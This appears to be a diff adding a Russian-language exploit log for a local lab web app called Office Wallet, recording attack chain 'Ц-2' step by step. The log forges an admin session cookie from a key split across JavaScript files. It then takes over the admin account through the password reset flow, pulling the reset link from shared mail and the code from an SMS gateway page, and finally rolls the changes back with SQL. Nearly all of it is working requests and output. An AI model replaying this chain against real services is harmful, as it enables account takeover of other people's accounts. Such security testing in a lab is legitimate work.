@@ -1,0 +1,46 @@
+OFFICE WALLET · ЦЕПОЧКА АТАКИ
+################################################################################################
+# Ц-2
+################################################################################################
+== Ц-2 · Админ-кука → полный захват аккаунта через сброс ==
+    · Сброс жертве (OW-26): ссылку читаем в общей почте (OW-27), код — в
+    · SMS-шлюзе под админ-кукой (OW-28). Срок действия кода и лимит попыток
+    · не проверяются. В конце — вход под жертвой и откат пароля.
+    → GET /static/wallet.js (кусок ключа)
+    ← HTTP 200 /* Office Wallet client */ window.OfficeWallet = {   keyParts: ["office", "-", "wallet"],   tipLimitRub: 50,   sessionKey() {     const tail = window.__SK_TAIL__ || "";     return this.keyParts.join("") + tail;   },   formatRub(kop) {     c...
+    → GET /static/legacy-sync.js (хвост ключа)
+    ← HTTP 200 /* Legacy supply sync helpers */ (function () {   window.SupplySync = {     pathParts: ["api", "v2", "supply", "pricing"],     endpoint() {       return "/" + this.pathParts.join("/");     },     async resolveChannel() {       const r = awa...
+    → SQL SELECT id FROM users WHERE login='adminw'
+    ← psql 6
+    HMAC-SHA256(office-wallet-session-key, '6:admin') = c59d80997f788119de7c0e28…
+    → POST /login  login=ivanov (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL SELECT password_hash FROM users WHERE login='adminw'
+    ← psql $2a$10$.WcgUxFiEZL4aYQrYr5bLun2/lMFs9Gifu4FENX2Z5AWs1dWOPy0u
+    → POST /password/forgot  login=adminw
+    ← HTTP 302 redirect=http://localhost:18081/password/forgot  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Сброс пароля · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.c...
+    → GET /mail  (ссылка на сброс видна всем вошедшим)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Уведомления · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.co...
+    → GET /gateway/sms  (код по заявке #49)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>SMS-шлюз · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">...
+    → POST /password/reset  rid=49&sms_code=963336&password=<новый>
+    ← HTTP 302 redirect=http://localhost:18081/login  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Вход · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   <...
+    → SQL SELECT password_hash FROM users WHERE login='adminw'
+    ← psql $2a$10$J63mbLYNaYVNPhdNVOlVFOVd1dqkudSMkch.LrD26DFZIP4eyO1/i
+    → POST /login  adminw (новый пароль)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    ┌─ АРТЕФАКТ · Ц-2 · пароль жертвы заменён, вход выполнен
+    │ POST /password/forgot → rid=49; ссылка из /mail, код 963336 из /gateway/sms
+    │ password_hash: $2a$10$.WcgUxFiEZL4aYQr… → $2a$10$J63mbLYNaYVNPhdN…
+    │ POST /login новым паролем → HTTP 200, кука выдана: ow.6.admin.c59d80997f788…
+    └─
+    → SQL UPDATE users SET password_hash='$2a$10$.WcgUxFiEZL4aYQrYr5bLun2/lMFs9Gifu4FENX2Z5AWs1dWOPy0u' WHERE login='adminw'
+    ← psql UPDATE 1
+    → SQL DELETE FROM password_resets WHERE id=49
+    ← psql DELETE 1
+    → SQL DELETE FROM sms_outbox WHERE rid=49
+    ← psql DELETE 1
+    → SQL DELETE FROM mail_outbox WHERE body LIKE '%rid=49%'
+    ← psql DELETE 1
+    откат: password_hash восстановлен, записи сброса удалены
+[+] ATO подтверждён: чужой пароль установлен и принят сервером
